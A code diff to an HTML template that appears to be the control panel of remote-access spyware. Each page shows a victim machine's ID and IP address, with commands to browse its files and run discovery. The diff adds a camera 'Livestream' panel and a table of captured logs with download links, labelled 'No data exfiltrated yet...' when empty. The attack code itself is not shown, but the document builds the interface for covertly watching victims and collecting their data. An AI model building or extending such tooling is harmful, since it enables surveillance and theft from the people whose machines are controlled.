@@ -8,8 +8,10 @@
     <meta name="description" content="" />
     <meta name="author" content="" />
     <title>{{ client_id }}</title>
-    <link href="https://cdn.jsdelivr.net/npm/simple-datatables@latest/dist/style.css" rel="stylesheet" />
     <link href="{{ url_for('static', filename='styles.css') }}" rel="stylesheet" />
+    <link href="https://cdn.datatables.net/1.13.2/css/jquery.dataTables.min.css" rel="stylesheet" />
+    <script src="https://code.jquery.com/jquery-3.5.1.js" crossorigin="anonymous"></script>
+    <script src="https://cdn.datatables.net/1.13.2/js/jquery.dataTables.min.js" crossorigin="anonymous"></script>
     <script src="https://use.fontawesome.com/releases/v6.1.0/js/all.js" crossorigin="anonymous"></script>
 </head>
 
@@ -23,7 +25,7 @@
             <nav class="sb-sidenav accordion sb-sidenav-dark" id="sidenavAccordion">
                 <div class="sb-sidenav-menu">
                     <div class="nav">
-                        
+
                         <div class="sb-sidenav-menu-heading">File System</div>
                         {% for command, args in file_listing_commands %}
                         <a class="nav-link"
@@ -34,8 +36,7 @@
                         <div class="sb-sidenav-menu-heading">Discovery</div>
 
                         {% for command_code, command in sidebar_commands %}
-                        <a class="nav-link"
-                            href="client?id={{ client_id }}&cmd={{ command_code }}">
+                        <a class="nav-link" href="client?id={{ client_id }}&cmd={{ command_code }}">
                             {{ command.label }}
                         </a>
                         {% endfor %}
@@ -48,26 +49,80 @@
             <main>
                 <div class="container-fluid px-4">
                     <h1 class="mt-4">{{ client_id }} (IP: {{ ip_address }})</h1>
-                    <div class="col-xl-12">
-                        <div class="card mb-4">
-                            <div class="card-header">
-                                <i class="fas fa-file me-1"></i>
-                                Files: {{ file_listing_directory }}
+                    <div class="row">
+                        <div class="col-xl-4">
+                            <div class="card mb-4" style="height:1080px;">
+                                <div class="card-header">
+                                    <i class="fas fa-camera me-1"></i>
+                                    Livestream
+                                </div>
+                                <div class="card-body">
+                                </div>
                             </div>
-                            <div class="card-body">
-                                {% if file_listing %}
+                        </div>
+                        <div class="col-xl-8">
+                            <div class="card mb-4" style="height:525px;">
+                                <div class="card-header">
+                                    <i class="fas fa-file me-1"></i>
+                                    Files: {{ file_listing_directory }}
+                                </div>
+                                <div class="card-body">
+                                    {% if file_listing %}
                                     {% for file in file_listing %}
-                                        <a href="client?id={{ client_id }}&cmd=0&args={{ file_listing_directory }},{{ file }}">{{ file }}</a>
-                                        <br>
+                                    <a
+                                        href="client?id={{ client_id }}&cmd=0&args={{ file_listing_directory }},{{ file }}">{{
+                                        file }}</a>
+                                    <br>
                                     {% endfor %}
-                                {% else %}
-                                    Looks like there are no files to display, use the 'File System' commands to retrieve information from host
-                                {% endif %}
+                                    {% else %}
+                                    Looks like there are no files to display, use the 'File System' commands to retrieve
+                                    information from host
+                                    {% endif %}
+                                </div>
+                            </div>
+                            <div class="card mb-4" style="height:525px;">
+                                <div class="card-header">
+                                    <i class="fas fa-database me-1"></i>
+                                    Database
+                                </div>
+                                <div class="card-body">
+                                    {% if database_listing %}
+                                    <table id="database" class="display" style="width:100%;">
+                                        <thead>
+                                            <tr>
+                                                <th>Log Type</th>
+                                                <th>Timestamp</th>
+                                                <th>Size</th>
+                                                <th></th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {% for entry in database_listing %}
+                                            <tr>
+                                                <td>{{ entry[0] }}</td>
+                                                <td>{{ entry[1] }}</td>
+                                                <td>{{ entry[2] }}</td>
+                                                <td><a type="button" class="btn btn-primary"
+                                                        href="data?log={{ entry[3] }}"><i class="fa fa-download"></i></a></td>
+                                            </tr>
+                                            {% endfor %}
+                                        </tbody>
+                                    </table>
+
+                                    <script>
+                                        $(document).ready(function () {
+                                            $('#database').DataTable();
+                                        });
+                                    </script>
+
+                                    {% else %}
+                                    No data exfiltrated yet...
+                                    {% endif %}
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-                
             </main>
             <footer class="py-4 bg-light mt-auto">
                 <div class="container-fluid px-4">
